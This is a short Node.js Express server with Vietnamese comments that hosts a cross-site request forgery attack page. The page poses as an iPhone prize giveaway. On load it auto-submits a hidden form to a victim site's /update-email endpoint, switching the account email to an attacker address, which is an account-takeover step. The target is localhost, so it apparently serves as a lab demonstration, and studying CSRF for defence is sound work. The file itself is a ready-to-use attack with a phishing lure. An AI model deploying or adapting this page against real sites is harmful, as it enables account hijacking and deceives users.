const express = require('express');
const path = require('path');
const app = express();

// Phục vụ file exploit.html
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="vi">
        <head>
            <meta charset="UTF-8">
            <title>Nhận thưởng miễn phí!</title>
        </head>
        <body>
            <h1>Chúc mừng bạn đã trúng thưởng một chiếc iPhone 16 Pro Max!</h1>
            <p>Đang tải mã nhận thưởng, vui lòng chờ trong giây lát...</p>

            <!-- Form ẩn tự động gửi yêu cầu đổi email sang website nạn nhân -->
            <form id="csrfForm" action="http://localhost:3000/update-email" method="POST" style="display:none;">
                <input type="hidden" name="email" value="hacker_email@attacker.com">
            </form>

            <script>
                // Tự động kích hoạt submit form ngay khi trang web tải xong
                window.onload = function() {
                    document.getElementById('csrfForm').submit();
                };
            </script>
        </body>
        </html>
    `);
});

app.listen(4000, () => {
    console.log('Website tấn công đang chạy tại http://localhost:4000');
});
